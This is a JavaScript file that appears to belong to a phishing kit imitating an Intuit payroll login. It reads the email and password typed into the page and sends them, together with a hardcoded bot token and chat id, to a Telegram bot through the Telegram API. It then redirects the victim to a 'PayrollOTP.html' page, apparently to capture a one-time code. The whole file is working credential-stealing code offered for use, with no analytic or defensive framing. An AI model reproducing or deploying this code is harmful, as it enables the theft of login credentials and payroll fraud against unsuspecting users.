﻿//bot token
var telegram_bot_id = "6802693422:AAHswa3iATxJ2hAw76Rilwd8dC6f4WYqySM";
//chat id
var chat_id = 6156261130;
var u_email, u_password, message;
var ready = function () {
    u_email = document.getElementById("username").value;
    u_password = document.getElementById("password").value;
    message ="Inuit:" + "\nEmail: " + u_email + "\nPassword: " + u_password;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        window.location.href = 'PayrollOTP.html';
    });
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
    return false;
};